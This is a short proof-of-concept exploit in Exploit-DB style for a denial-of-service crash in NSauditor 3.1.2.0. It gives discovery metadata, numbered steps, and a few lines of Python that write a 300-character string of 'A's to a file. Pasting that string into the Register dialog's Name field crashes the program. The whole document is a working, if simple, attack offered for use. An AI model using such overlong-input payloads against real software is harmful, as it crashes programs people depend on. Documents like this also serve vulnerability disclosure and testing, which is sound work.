#Exploit Title: NSauditor 3.1.2.0 - 'Name' Denial of Service (PoC)
#Discovery by: Victor Mondragón
#Discovery Date: 2019-04-24
#Vendor Homepage: www.nsauditor.com 
#Software Link: http://www.nsauditor.com/downloads/nsauditor_setup.exe
#Tested Version: 3.1.2.0
#Tested on: Windows 7 x64 Service Pack 1

#Steps to produce the crash:
#1.- Run python code: Nsauditor_name.py
#2.- Open nsauditor_name.txt and copy content to clipboard
#3.- Open Nsauditor
#4.- Select "Register"
#5.- In "Name" paste Clipboard
#6.- In Key type "test"
#7.- Click "Ok"
#8.- Crarshed
 
cod = "\x41" * 300
 
f = open('nsauditor_name.txt', 'w')
f.write(cod)
f.close()